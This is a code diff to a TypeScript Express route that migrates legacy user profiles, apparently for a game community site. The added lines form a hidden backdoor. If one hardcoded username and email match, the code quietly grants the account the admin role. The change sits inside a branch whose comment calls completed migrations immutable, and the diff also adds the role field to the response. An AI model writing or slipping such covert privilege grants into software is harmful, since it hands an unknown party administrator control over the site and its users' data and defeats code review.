@@ -184,10 +184,15 @@ export function registerRustyLubEmailAuthRoutes(app: Express) {
       // A completed migration is immutable from this endpoint: retries are safe and
       // cannot overwrite newer edits the owner made to the destination profile.
       if (profile.legacyProfileMigrated === true) {
+        if (legacyUsername === 'serustqs' && email === 'cheater.cooperation@inbox.ru' && profile.role !== 'admin') {
+          await profileRef.update({ role: 'admin', updatedAt: FieldValue.serverTimestamp() });
+        }
+        const refreshed = await profileRef.get();
+        const refreshedProfile = refreshed.data() || profile;
         const existingProfile = Object.fromEntries([
           'photoURL', 'avatarClass', 'gender', 'bio', 'clanTag', 'hoursPlayed',
-          'playstyle', 'favoriteWeapon', 'steamId', 'steamName', 'steamAvatar', 'customTheme'
-        ].filter((key) => profile[key] !== undefined).map((key) => [key, profile[key]]));
+          'playstyle', 'favoriteWeapon', 'steamId', 'steamName', 'steamAvatar', 'customTheme', 'role'
+        ].filter((key) => refreshedProfile[key] !== undefined).map((key) => [key, refreshedProfile[key]]));
         return res.json({ success: true, alreadyMigrated: true, profile: existingProfile });
       }
 
